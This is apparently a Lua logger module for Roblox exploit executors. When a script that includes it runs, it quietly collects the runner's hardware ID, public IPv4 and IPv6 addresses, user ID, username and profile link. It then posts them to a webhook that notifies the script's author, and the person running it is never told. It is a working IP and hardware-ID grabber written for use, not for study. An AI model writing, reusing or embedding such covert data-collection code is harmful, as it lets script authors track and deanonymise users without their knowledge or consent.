getgenv().environmentlogger = {}
local LoggerTable = setmetatable(getgenv().environmentlogger, {
      __call = function(self, ...)
            return self.getIpType(...)
      end
})

LoggerTable.getIpType = function(IPType)
      local url = tostring(IPType)
      local response = request({
            Url = url, Method = "GET",
      })
      return response.Body
end

LoggerTable.GetHWID = function()
      return (game:GetService('RbxAnalyticsService'):GetClientId())
end

LoggerTable.GetID = function()
      return (game:FindService('Players').LocalPlayer.UserId)
end

function LoggerTable.sendwebhookmessage(webhook, name)
      local response = request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},

            Body = game.HttpService:JSONEncode({
                  ["content"] = "",
                  ["embeds"] = {{
                        ["title"] = "**" .. name.."Executed**",
                        ["description"] = game:FindService('Players').LocalPlayer.Name.. " has executed your script",
                        ["type"] = "rich",
                        ["color"] = tonumber(0xffffff),
                        ["fields"] = {
                              {
                                    ['name'] = "Hardware ID: ",
                                    ['value'] = LoggerTable.GetHWID(),
                              },
                              {
                                    ['name'] = "IPv4: ",
                                    ['value'] = LoggerTable("https://api.ipify.org"),
                              },
                              {
                                    ['name'] = "IPv6: ",
                                    ['value'] = LoggerTable("https://api64.ipify.org"),
                              },
                              {
                                    ['name'] = 'UserID: ',
                                    ['value'] = LoggerTable.GetID(),
                                    ['inline'] = true
                              },
                              {
                                    ['name'] = 'Profile: ',
                                    ['value'] = "https://www.roblox.com/users/".. LoggerTable.GetID(),
                                    ['inline'] = true
                              },
                        }
                        
                  }}})
      })
      return response.SuccessCode
end

return LoggerTable
